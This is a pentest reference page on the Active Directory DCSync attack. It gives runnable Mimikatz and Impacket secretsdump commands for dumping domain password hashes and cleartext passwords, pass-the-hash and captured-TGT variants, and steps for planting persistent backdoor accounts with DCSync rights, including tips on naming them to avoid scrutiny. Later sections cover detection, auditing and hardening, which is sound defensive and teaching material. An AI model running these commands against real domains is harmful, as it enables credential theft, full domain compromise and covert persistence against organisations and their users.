# DCSync

### Overview

**DCSync** is a powerful Active Directory attack technique that allows an attacker to impersonate a Domain Controller and request password data from other Domain Controllers using the Directory Replication Service Remote Protocol (MS-DRSR). This attack extracts password hashes for any user account, including privileged accounts like domain admins and the krbtgt account, without executing code on a Domain Controller.

**Key Concepts:**

* **MS-DRSR Protocol** - Directory Replication Service Remote Protocol used by DCs to synchronize data
* **Replication Rights** - Special permissions allowing accounts to request password replication
* **NTDS.dit Replication** - Simulating DC behavior to extract credential data
* **Offline Hash Extraction** - Retrieving password hashes without touching LSASS or accessing DC file system

**Why this matters:** DCSync is devastating because:

* Extracts password hashes for any domain account remotely
* Doesn't require code execution on Domain Controller
* Uses legitimate Active Directory protocol (can't be disabled)
* Difficult to detect without proper monitoring
* Grants immediate path to Domain Admin compromise

**Attack advantages:**

* No need for direct DC access
* No suspicious process execution on DC
* Works from any domain-joined machine
* Can target specific accounts or dump entire domain
* Retrieves NTLM hashes and Kerberos keys

**Common attack path:**

```
1. Compromise account with replication rights
2. Execute DCSync from compromised workstation
3. Extract krbtgt hash for Golden Ticket
4. Or extract DA hashes for immediate access
5. Maintain persistent domain admin access
```

***

### Exploitation Workflow Summary

1. Reconnaissance ├─ Identify accounts with DCSync rights ├─ Check current user privileges ├─ Enumerate Domain Controllers └─ Verify network connectivity to DCs
2. Credential Acquisition ├─ Obtain account with replication rights ├─ Or compromise Domain Admin account ├─ Or exploit misconfigured ACLs └─ Validate credentials work
3. DCSync Execution ├─ Target specific high-value accounts (krbtgt, DA) ├─ Or dump entire domain database ├─ Extract NTLM hashes and Kerberos keys └─ Save output for offline use
4. Hash Validation ├─ Test extracted hashes ├─ Identify privileged accounts ├─ Check for reversible encryption passwords └─ Plan privilege escalation
5. Post-Exploitation ├─ Pass-the-Hash with DA credentials ├─ Create Golden Ticket with krbtgt hash ├─ Establish persistence mechanisms └─ Lateral movement to critical systems
6. Persistence (Optional) ├─ Grant DCSync rights to controlled account ├─ Maintain covert access ├─ Backup extracted credentials └─ Document compromised accounts

***

### Understanding DCSync Permissions

#### Required Replication Rights

**DCSync requires three specific Active Directory permissions:**

**1. DS-Replication-Get-Changes**

```
GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
Purpose: Allows replication of changes from directory
Scope: Domain NC (Naming Context)
```

**2. Replicating Directory Changes All**

```
GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
Purpose: Allows replication of all directory changes (including secrets)
Scope: Domain NC
Critical: This permission grants access to password hashes
```

**3. Replicating Directory Changes In Filtered Set**

```
GUID: 89e95b76-444d-4c62-991a-0facbeda640c
Purpose: Allows replication of confidential attributes
Scope: Domain NC
Optional: Some tools don't require this
```

**Why these permissions exist:** Domain Controllers need to replicate Active Directory data between each other for consistency. These permissions allow legitimate DC replication. Attackers abuse these same permissions to extract credential data.

#### Default Privileged Groups

**Groups with DCSync rights by default:**

```
Domain Admins
Enterprise Admins (forest root domain)
Administrators (built-in)
Domain Controllers (computer accounts)
Read-Only Domain Controllers (limited)
```

**Important notes:**

* Regular domain users do NOT have these rights
* Service accounts should NOT have these rights
* Any custom group with these rights is a critical security risk
* Misconfigured delegations often grant unintended DCSync rights

#### Why DCSync Cannot Be Disabled

**MS-DRSR is essential for Active Directory:**

* Domain Controllers must replicate data
* Disabling replication breaks Active Directory
* Multi-DC environments require constant synchronization
* User password changes must propagate to all DCs
* Group membership updates need replication

**Defense strategy:** Since you can't disable MS-DRSR, you must:

* Strictly control who has replication rights
* Monitor for suspicious replication requests
* Audit ACLs on domain object regularly
* Alert on Event IDs indicating DCSync activity

***

### Enumeration

#### Identify Accounts with DCSync Rights

**PowerView enumeration:**

```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | 
  ?{($_.ObjectType -match 'replication-get') -or 
    ($_.ActiveDirectoryRights -match 'GenericAll') -or 
    ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

**What this checks:**

* `ObjectType -match 'replication-get'` - Accounts with replication permissions
* `ActiveDirectoryRights -match 'GenericAll'` - Full control (includes DCSync)
* `ActiveDirectoryRights -match 'WriteDacl'` - Can grant themselves DCSync rights

**Expected output:**

```
ActiveDirectoryRights : ExtendedRight
ObjectDN              : DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : DS-Replication-Get-Changes
IdentityReference     : DOLLARCORP\Domain Admins
IsInherited           : False
ObjectFlags           : ObjectAceTypePresent

ActiveDirectoryRights : ExtendedRight
ObjectDN              : DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : DS-Replication-Get-Changes-All
IdentityReference     : DOLLARCORP\svc_backup
IsInherited           : False
ObjectFlags           : ObjectAceTypePresent
```

**Analysis:**

* `Domain Admins` - Expected (default group)
* `svc_backup` - **ALERT!** Non-standard account with DCSync rights (potential target)

**Simplified enumeration:**

```powershell
# Get accounts with replication rights
Get-ObjectAcl -DistinguishedName "dc=domain,dc=local" -ResolveGUIDs | 
  ?{$_.ObjectType -like "*replication*"} | 
  Select-Object IdentityReference,ObjectType | 
  Sort-Object -Unique IdentityReference
```

**Using BloodHound:**

```
# Cypher query to find DCSync rights
MATCH p=(n1)-[r:MemberOf|GetChanges|GetChangesAll*1..]->(u:Domain) 
RETURN p

# Or use built-in query:
"Principals with DCSync Rights"
```

**Manual LDAP query:**

```bash
# Linux - ldapsearch
ldapsearch -x -h dc.domain.local -D "user@domain.local" -W \
  -b "DC=domain,DC=local" \
  "(objectClass=domain)" nTSecurityDescriptor
```

***

### Local Exploitation (Windows)

#### Mimikatz DCSync

**Basic DCSync for specific user:**

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

**Parameters:**

* `lsadump::dcsync` - DCSync module in Mimikatz
* `/user:dcorp\krbtgt` - Target account (domain\username format)

**Expected output:**

```
[DC] 'dollarcorp.moneycorp.local' will be the domain
[DC] 'DCORP-DC.dollarcorp.moneycorp.local' will be the DC server
[DC] 'dcorp\krbtgt' will be the user account

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 11/21/2022 3:23:11 AM
Object Security ID   : S-1-5-21-1874506631-3219952063-538504511-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: ff46a9d8bd66c6efd77603da26796f35
    ntlm- 0: ff46a9d8bd66c6efd77603da26796f35
    lm  - 0: 336d863559a3f7e69371a85ad959236e

Supplemental Credentials:
* Primary:Kerberos-Newer-Keys *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
      aes128_hmac       (4096) : e74fa5a9aa05b2c0b2d196e226d8820e
      des_cbc_md5       (4096) : ba3d3b6c43a87f7b
```

**What you get:**

* **NTLM Hash** - For Pass-the-Hash attacks
* **AES256/AES128 Keys** - For Kerberos Golden Ticket
* **LM Hash** - Legacy hash (usually empty in modern environments)
* **Credentials History** - If password was changed multiple times

**Target multiple users:**

```powershell
# DCSync all Domain Admins
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\administrator"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\admin_backup"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\admin_helpdesk"'
```

**DCSync specific domain controller:**

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt /dc:DCORP-DC.dollarcorp.moneycorp.local"'
```

**Parameters:**

* `/dc:DCORP-DC.dollarcorp.moneycorp.local` - Target specific DC (useful in multi-DC environments)

***

### Remote Exploitation (Linux)

#### Impacket secretsdump

**Basic DCSync (dump entire domain):**

```bash
secretsdump.py -just-dc domain/username:password@dc.domain.local -outputfile dcsync_hashes
```

**Parameters explained:**

* `-just-dc` - Perform DCSync attack only (no local dumps)
* `domain/username:password` - Credentials with DCSync rights
* `@dc.domain.local` - Target Domain Controller FQDN or IP
* `-outputfile dcsync_hashes` - Save output with this prefix

**Expected output:**

```
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ff46a9d8bd66c6efd77603da26796f35:::
svc_sql:1104:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
[*] Cleaning up...
```

**Output files created:**

```
dcsync_hashes.ntds - NTLM hashes in format username:uid:lmhash:nthash
dcsync_hashes.ntds.kerberos - Kerberos keys (AES256, AES128, DES)
dcsync_hashes.ntds.cleartext - Cleartext passwords (if reversible encryption enabled)
```

**Hash format explained:**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
     ↓         ↓              ↓                          ↓
  Username    RID         LM Hash                   NT Hash
```

#### Target Specific User

**DCSync single account only:**

```bash
secretsdump.py -just-dc-user krbtgt domain/username:password@dc.domain.local
```

**Parameters:**

* `-just-dc-user krbtgt` - Only extract this user's credentials

**Why target specific users:**

* Reduces detection risk (less replication traffic)
* Faster execution
* Focused on high-value targets
* Less event log noise

**High-value targets:**

```bash
# krbtgt (Golden Ticket creation)
secretsdump.py -just-dc-user krbtgt domain/user:pass@dc.domain.local

# Domain Admins
secretsdump.py -just-dc-user administrator domain/user:pass@dc.domain.local

# Enterprise Admins (forest root)
secretsdump.py -just-dc-user "enterprise admin account" domain/user:pass@dc.domain.local

# Service accounts with high privileges
secretsdump.py -just-dc-user svc_backup domain/user:pass@dc.domain.local
```

#### Additional Options

**Show password last set dates:**

```bash
secretsdump.py -just-dc -pwd-last-set domain/username:password@dc.domain.local
```

**Expected output:**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: (pwdLastSet: 2024-01-15 09:23:45)
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ff46a9d8bd66c6efd77603da26796f35::: (pwdLastSet: 2022-11-21 03:23:11)
```

**Why this matters:**

* Old passwords are security risks
* krbtgt password age indicates Golden Ticket persistence window
* Helps prioritize which accounts to crack
* Identifies accounts with weak password policies

**Dump password history:**

```bash
secretsdump.py -just-dc -history domain/username:password@dc.domain.local
```

**What this shows:**

* Previous password hashes
* Password reuse patterns
* Historical passwords for offline cracking
* Users who cycle between same passwords

**Expected output:**

```
svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
svc_backup_history0:1104:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
svc_backup_history1:1104:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
```

**Use NTLM hash for authentication:**

```bash
secretsdump.py -just-dc -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 domain/username@dc.domain.local
```

**Parameters:**

* `-hashes :NTHASH` - Authenticate with NTLM hash (Pass-the-Hash)
* Leave LM hash empty (modern systems don't use it)

***

### DCSync with Captured TGT

#### Understanding the Technique

**Scenario:** You've captured a Domain Controller machine account TGT (via unconstrained delegation or other means).

**Captured TGT example:**

```
DC01$@DOMAIN.LOCAL_krbtgt@DOMAIN.LOCAL.ccache
```

**Why this works:**

* DC machine accounts have DCSync rights by default
* TGT authenticates you as the DC
* Can perform DCSync without knowing any passwords
* Leverages legitimate DC privileges

**Attack path:**

```
1. Exploit unconstrained delegation
2. Force DC authentication (PetitPotam, PrinterBug, etc.)
3. Capture DC TGT from memory
4. Use TGT for Kerberos authentication
5. Execute DCSync as DC machine account
```

#### Setup Kerberos Configuration

**Generate krb5.conf file:**

```bash
# Using NetExec helper
netexec smb dc01.domain.local --generate-krb5-file krb5.conf

# Install configuration
sudo tee /etc/krb5.conf < krb5.conf
```

**What this does:**

* Creates proper Kerberos configuration
* Sets default realm
* Configures KDC locations
* Enables Kerberos authentication

**Manual krb5.conf example:**

```ini
[libdefaults]
    default_realm = DOMAIN.LOCAL
    dns_lookup_kdc = true
    dns_lookup_realm = true

[realms]
    DOMAIN.LOCAL = {
        kdc = dc01.domain.local
        admin_server = dc01.domain.local
    }

[domain_realm]
    .domain.local = DOMAIN.LOCAL
    domain.local = DOMAIN.LOCAL
```

#### Execute DCSync with ccache

**Using NetExec:**

```bash
KRB5CCNAME=DC01$@DOMAIN.LOCAL_krbtgt@DOMAIN.LOCAL.ccache \
  netexec smb dc01.domain.local --use-kcache --ntds
```

**Parameters:**

* `KRB5CCNAME=` - Environment variable pointing to ccache file
* `--use-kcache` - Use Kerberos credential cache
* `--ntds` - Dump NTDS.dit via DCSync

**Expected output:**

```
SMB  dc01.domain.local  445  DC01  [+] DOMAIN.LOCAL\DC01$ (Pwn3d!)
SMB  dc01.domain.local  445  DC01  [*] Dumping NTDS with DCSync
SMB  dc01.domain.local  445  DC01  Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB  dc01.domain.local  445  DC01  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ff46a9d8bd66c6efd77603da26796f35:::
```

**Using Impacket secretsdump:**

```bash
KRB5CCNAME=DC01$@DOMAIN.LOCAL_krbtgt@DOMAIN.LOCAL.ccache \
  secretsdump.py -just-dc -k -no-pass DOMAIN/ -dc-ip 10.10.10.5
```

**Parameters:**

* `-just-dc` - DCSync only
* `-k` - Use Kerberos authentication
* `-no-pass` - Don't prompt for password (using TGT)
* `DOMAIN/` - Domain name (no username needed)
* `-dc-ip 10.10.10.5` - DC IP address

**Why use DC TGT:**

* No need to compromise Domain Admin account
* Leverages legitimate DC privileges
* Harder to detect (looks like DC-to-DC replication)
* Bypasses some monitoring focused on user accounts

***

### Reversible Encryption Passwords

#### Understanding Reversible Encryption

**What is reversible encryption:** Active Directory can store passwords in a reversibly encrypted format (essentially weakly encrypted plaintext). This is required for certain authentication protocols like CHAP.

**Why it exists:**

* Legacy application compatibility
* Digest authentication support
* IAS/RADIUS integration
* CHAP protocol requirements

**Security implication:** Storing passwords with reversible encryption is almost as bad as storing them in plaintext. DCSync retrieves these passwords in **cleartext**.

#### Identify Accounts with Reversible Encryption

**PowerView query:**

```powershell
Get-DomainUser -Identity * | 
  ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | 
  Select-Object samaccountname,useraccountcontrol
```

**Expected output:**

```
samaccountname  useraccountcontrol
--------------  ------------------
svc_legacy      NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, ENCRYPTED_TEXT_PWD_ALLOWED
oldapp_admin    NORMAL_ACCOUNT, ENCRYPTED_TEXT_PWD_ALLOWED
```

**Checking via LDAP:**

```bash
ldapsearch -x -h dc.domain.local -D "user@domain.local" -W \
  -b "DC=domain,DC=local" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=128))" \
  samaccountname useraccountcontrol
```

**UserAccountControl flag:**

```
0x00000080 (128 decimal) = ENCRYPTED_TEXT_PWD_ALLOWED
```

#### Extract Cleartext Passwords

**DCSync output includes cleartext passwords:**

```bash
secretsdump.py -just-dc domain/username:password@dc.domain.local -outputfile dcsync_hashes
```

**Check the cleartext file:**

```bash
cat dcsync_hashes.ntds.cleartext
```

**Expected output:**

```
svc_legacy:CLEARTEXT:P@ssw0rd123!Legacy
oldapp_admin:CLEARTEXT:ApplicationPassword2020
```

**Why this is critical:**

* No need to crack hashes
* Immediate plaintext password access
* Can reuse passwords across systems
* High-value target for lateral movement

**Recommendation for defense:**

```powershell
# Find and disable reversible encryption
Get-DomainUser -Identity * | 
  ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | 
  ForEach-Object {
    Set-ADUser $_.samaccountname -AllowReversiblePasswordEncryption $false
    # Force password change to remove old reversibly encrypted password
    Set-ADUser $_.samaccountname -ChangePasswordAtLogon $true
  }
```

***

### Persistence via DCSync Rights

#### Granting DCSync Rights

**If you have Domain Admin privileges**, you can grant DCSync rights to any account you control for persistent access.

**Add DCSync rights to account:**

```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName backdoor_user -Rights DCSync -Verbose
```

**Parameters:**

* `-TargetDistinguishedName` - Domain root DN
* `-PrincipalSamAccountName backdoor_user` - Account to grant rights to
* `-Rights DCSync` - Grant all three DCSync permissions

**Expected output:**

```
VERBOSE: Getting object: dc=dollarcorp,dc=moneycorp,dc=local
VERBOSE: Getting principal: backdoor_user
VERBOSE: [Get-DomainObjectAcl] Granted DCSync rights to backdoor_user
```

**What this does:** Grants these three permissions to `backdoor_user`:

1. DS-Replication-Get-Changes
2. Replicating Directory Changes All
3. Replicating Directory Changes In Filtered Set

#### Verify DCSync Rights

**Check if rights were correctly assigned:**

```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | 
  ?{$_.IdentityReference -match "backdoor_user"}
```

**Expected output:**

```
ActiveDirectoryRights : ExtendedRight
ObjectDN              : DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : DS-Replication-Get-Changes
IdentityReference     : DOLLARCORP\backdoor_user
IsInherited           : False

ActiveDirectoryRights : ExtendedRight
ObjectDN              : DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : DS-Replication-Get-Changes-All
IdentityReference     : DOLLARCORP\backdoor_user
IsInherited           : False

ActiveDirectoryRights : ExtendedRight
ObjectDN              : DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : DS-Replication-Get-Changes-In-Filtered-Set
IdentityReference     : DOLLARCORP\backdoor_user
IsInherited           : False
```

**Verification checklist:**

* ✓ All three permissions present
* ✓ IdentityReference shows correct username
* ✓ ObjectType shows replication permissions
* ✓ IsInherited = False (explicitly granted, not inherited)

#### Using Backdoor Account

**Once rights are granted:**

```bash
# From Linux
secretsdump.py -just-dc-user krbtgt domain/backdoor_user:password@dc.domain.local

# Anytime in the future, even if original DA account is disabled
secretsdump.py -just-dc domain/backdoor_user:password@dc.domain.local
```

**Persistence advantages:**

* Survives password resets of original compromise
* Low-privilege-looking account name (less scrutiny)
* Can be service account (blends in)
* Multiple backdoor accounts for redundancy

**Operational security:**

```
Good backdoor account names:
- svc_monitoring
- svc_backup
- svc_replication
- admin_tool

Bad backdoor account names:
- backdoor
- persistence
- pwned
- hacker123
```

#### Alternative Persistence Methods

**Grant rights to group:**

```powershell
# Create custom group
New-ADGroup -Name "Replication Services" -GroupScope DomainLocal

# Grant DCSync to group
Add-ObjectAcl -TargetDistinguishedName "dc=domain,dc=local" -PrincipalSamAccountName "Replication Services" -Rights DCSync

# Add your backdoor account to group
Add-ADGroupMember -Identity "Replication Services" -Members backdoor_user
```

**Why use a group:**

* Less obvious than direct user permissions
* Can add/remove members without touching ACLs
* Looks more legitimate
* Easier to manage multiple backdoor accounts

***

### Detection

#### Event IDs for DCSync Detection

**Primary detection events:**

**Event ID 4662 - An operation was performed on an object**

```
Audit Policy Required: 
- Audit Directory Service Access (Success)

Event Details:
Object Type: %{19195a5b-6da0-11d0-afd3-00c04fd930c9}  (domainDNS)
Object Name: DC=domain,DC=local
Operation:
  {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}  (DS-Replication-Get-Changes)
  {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}  (DS-Replication-Get-Changes-All)
```

**Why Event 4662:**

* Logs replication operations
* Shows which account performed DCSync
* Includes source IP address
* Timestamps the attack

**Event ID 5136 - A directory service object was modified**

```
Audit Policy Required:
- Audit Directory Service Changes (Success)

Use Case: Detects when DCSync rights are granted

Event Details:
Object DN: DC=domain,DC=local
Attribute: nTSecurityDescriptor
Operation: Modify
```

**Why Event 5136:**

* Detects persistence (granting DCSync rights)
* Shows ACL modifications
* Identifies who granted the permissions
* Prevents backdoor creation

**Event ID 4670 - Permissions on an object were changed**

```
Audit Policy Required:
- Audit Authorization Policy Change (Success)

Use Case: Alternative detection for permission changes

Event Details:
Object Name: DC=domain,DC=local
New Permissions: (includes replication rights)
```

#### Detection Strategy

**Enable required audit policies:**

```
Computer Configuration → Policies → Windows Settings → 
Security Settings → Advanced Audit Policy Configuration → 
Audit Policies → DS Access

Enable:
✓ Audit Directory Service Access (Success, Failure)
✓ Audit Directory Service Changes (Success, Failure)
```

**PowerShell to enable auditing:**

```powershell
# Enable directory service auditing
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable

# Configure SACL on domain object (requires elevated privileges)
$DomainDN = (Get-ADDomain).DistinguishedName
$GUID = @{
    'DS-Replication-Get-Changes' = '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'
    'DS-Replication-Get-Changes-All' = '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'
}

# Add SACL entries
```

**SIEM detection query example (Splunk):**

```
index=windows EventCode=4662 
| where Message like "%1131f6ad-9c07-11d1-f79f-00c04fc2dcd2%"
| where Account_Name!="*$"
| stats count by Account_Name, Computer, _time
| where count > 0
```

**Alert conditions:**

```
ALERT IF:
- Event 4662 with DS-Replication-Get-Changes-All
- AND Account is NOT a Domain Controller (not ending with $)
- AND Account is NOT in known replication service accounts list
- AND Source IP is NOT a Domain Controller IP
```

#### Behavioral Detection

**Normal DCSync behavior:**

```
Source: Domain Controller computer account (DC01$)
Target: Domain Controller
Frequency: Continuous (normal replication)
Pattern: Bidirectional between DCs
```

**Malicious DCSync behavior:**

```
Source: User account or compromised workstation
Target: Domain Controller
Frequency: Burst (short duration, many accounts)
Pattern: Unidirectional (attacker → DC)
Timing: Often off-hours or unusual times
```

**Detection patterns:**

```
1. DCSync from non-DC computer accounts
2. DCSync from user accounts (especially non-admin)
3. Large volume of replication requests in short time
4. DCSync for krbtgt account specifically
5. First-time DCSync from unfamiliar accounts
```

***

### Mitigation and Hardening

#### Strict Permission Control

**Principle of least privilege:**

```
✓ Only Domain Controllers should have DCSync rights
✓ Domain Admins inherit rights (necessary evil)
✓ Regular users should NEVER have replication rights
✓ Service accounts should NOT have DCSync rights
✗ Custom groups with replication rights (review thoroughly)
```

**Regular ACL audits:**

```powershell
# Monthly audit: Find non-standard DCSync permissions
Get-ObjectAcl -DistinguishedName "dc=domain,dc=local" -ResolveGUIDs | 
  ?{($_.ObjectType -match 'replication-get') -and 
    ($_.IdentityReference -notmatch 'Domain Admins|Enterprise Admins|Administrators|Domain Controllers')} | 
  Select-Object IdentityReference, ObjectType, ActiveDirectoryRights
```

**Remove unnecessary permissions:**

```powershell
# Remove DCSync rights from specific account
Remove-ObjectAcl -TargetDistinguishedName "dc=domain,dc=local" -PrincipalSamAccountName suspicious_account -Rights DCSync
```

#### Enable Comprehensive Auditing

**Configure auditing on domain object:**

```
1. Open Active Directory Users and Computers
2. View → Advanced Features
3. Right-click domain root → Properties → Security → Advanced → Auditing
4. Add auditing entries for:
   - DS-Replication-Get-Changes
   - DS-Replication-Get-Changes-All
   - Everyone (or Domain Users)
   - Success attempts
```

**Monitor continuously:**

* Centralize logs to SIEM
* Real-time alerting on Event 4662
* Baseline normal replication patterns
* Alert on anomalies

#### Protected Users Security Group

**Add high-value accounts to Protected Users:**

```powershell
Add-ADGroupMember -Identity "Protected Users" -Members krbtgt, Administrator, DA_Accounts
```

**What Protected Users does:**

* Enforces AES encryption (no RC4)
* No NTLM authentication allowed
* No DES or RC4 for Kerberos pre-auth
* No credential delegation
* TGT lifetime limited to 4 hours

**Note:** Protected Users doesn't prevent DCSync itself, but limits what attackers can do with stolen credentials.

#### Additional Hardening

**Implement tiering model:**

```
Tier 0: Domain Controllers, Domain Admins, Enterprise Admins
Tier 1: Server administrators, application admins
Tier 2: Workstation users, help desk

Rule: Tier 0 credentials NEVER used on lower tiers
Result: If workstation compromised, no Tier 0 creds to steal
```

**Use AD ACL Scanner:**

```
Tool: ADACLScanner
Purpose: Regular ACL audits
Download: https://github.com/canix1/ADACLScanner

Usage:
1. Create baseline report of domain ACLs
2. Run monthly comparisons
3. Alert on unexpected changes
4. Investigate new replication rights immediately
```

**Disable reversible encryption:**

```
Group Policy:
Computer Configuration → Policies → Windows Settings → 
Security Settings → Account Policies → Password Policy
"Store passwords using reversible encryption" = Disabled

Force password changes for accounts that had it enabled.
```

***

### Troubleshooting

#### Error: "Access Denied" During DCSync

**Problem:** DCSync fails with access denied error

**Cause 1: Insufficient permissions**

```powershell
# Verify you have DCSync rights
Get-ObjectAcl -DistinguishedName "dc=domain,dc=local" -ResolveGUIDs | 
  ?{($_.ObjectType -match 'replication-get') -and 
    ($_.IdentityReference -match $env:USERNAME)}
```

**Solution:** Use account with proper permissions (Domain Admin or account with explicit DCSync rights)

**Cause 2: Account not in privileged group**

```
net user username /domain

# Check if member of:
- Domain Admins
- Enterprise Admins
- Administrators
```

**Cause 3: Protected Users group limitation**

```
If account is in Protected Users:
- Some replication operations may be restricted
- Try with account not in Protected Users
```

#### Error: "The RPC server is unavailable"

**Problem:** Cannot reach Domain Controller

```
ERROR: The RPC server is unavailable
```

**Solution 1: Verify connectivity**

```bash
# Check if DC is reachable
ping dc.domain.local

# Check RPC port (135)
nmap -p 135,445 dc.domain.local

# Check dynamic RPC ports (49152-65535)
nmap -p 49152-65535 dc.domain.local
```

**Solution 2: Firewall rules**

```
Required ports:
- 135/TCP (RPC Endpoint Mapper)
- 445/TCP (SMB)
- 49152-65535/TCP (Dynamic RPC)
- 53/TCP+UDP (DNS)
- 88/TCP+UDP (Kerberos)
```

**Solution 3: Try different DC**

```bash
# If one DC is unreachable, target another
secretsdump.py -just-dc domain/user:pass@dc02.domain.local
```

#### Error: "Clock skew too great" (KRB\_AP\_ERR\_SKEW)

**Problem:** Time difference between attacker and DC

```
Kerberos SessionError: KRB_AP_ERR_SKEW
```

**Solution:**

```bash
# Sync time with DC
sudo ntpdate dc.domain.local

# Or use rdate
sudo rdate -n dc.domain.local

# Verify time
date
```

#### Error: "STATUS\_LOGON\_FAILURE"

**Problem:** Authentication failed

**Cause 1: Wrong credentials**

```
Double-check:
- Username spelling
- Domain name
- Password (especially special characters)
```

**Cause 2: Account locked or disabled**

```powershell
# Check account status
Get-ADUser username -Properties LockedOut, Enabled

# If locked, unlock:
Unlock-ADAccount username
```

**Cause 3: Password expired**

```
If account password expired:
- Reset password
- Or use NTLM hash with -hashes flag
```

#### Issue: No Output Files Created

**Problem:** secretsdump runs but no .ntds files created

**Cause:** Forgot -outputfile parameter

**Solution:**

```bash
# Correct command with output file
secretsdump.py -just-dc domain/user:pass@dc.domain.local -outputfile dcsync_output

# Check for files:
ls -la dcsync_output*
```

**Files should be created:**

```
dcsync_output.ntds
dcsync_output.ntds.kerberos
dcsync_output.ntds.cleartext (if any reversible encryption passwords)
```

***

### Quick Reference

#### Enumeration Commands

```powershell
# PowerView - Find accounts with DCSync rights
Get-ObjectAcl -DistinguishedName "dc=domain,dc=local" -ResolveGUIDs | ?{$_.ObjectType -match 'replication-get'} | Select IdentityReference,ObjectType

# Check if specific user has DCSync rights
Get-ObjectAcl -DistinguishedName "dc=domain,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -and ($_.IdentityReference -match "username")}

# Find accounts with reversible encryption
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | Select samaccountname
```

#### Exploitation Commands

```powershell
# Windows - Mimikatz
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\administrator"'
```

```bash
# Linux - Impacket (full dump)
secretsdump.py -just-dc domain/user:pass@dc.domain.local -outputfile output

# Linux - Specific user
secretsdump.py -just-dc-user krbtgt domain/user:pass@dc.domain.local

# Linux - With password history
secretsdump.py -just-dc -history domain/user:pass@dc.domain.local

# Linux - Show password ages
secretsdump.py -just-dc -pwd-last-set domain/user:pass@dc.domain.local

# Linux - Using NTLM hash
secretsdump.py -just-dc -hashes :NTHASH domain/user@dc.domain.local

# Linux - Using captured TGT
KRB5CCNAME=dc.ccache secretsdump.py -just-dc -k -no-pass DOMAIN/ -dc-ip DC_IP
```

#### Persistence Commands

```powershell
# Grant DCSync rights to backdoor account
Add-ObjectAcl -TargetDistinguishedName "dc=domain,dc=local" -PrincipalSamAccountName backdoor_user -Rights DCSync -Verbose

# Verify rights were granted
Get-ObjectAcl -DistinguishedName "dc=domain,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "backdoor_user"}

# Remove DCSync rights (cleanup)
Remove-ObjectAcl -TargetDistinguishedName "dc=domain,dc=local" -PrincipalSamAccountName backdoor_user -Rights DCSync
```

#### Detection Commands

```powershell
# Enable auditing
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable

# Search for DCSync events
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4662} | 
  Where-Object {$_.Message -match '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'}

# Find permission changes (persistence detection)
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=5136} | 
  Where-Object {$_.Message -match 'replication'}
```

#### Hash Format

```
Format: username:uid:lmhash:nthash
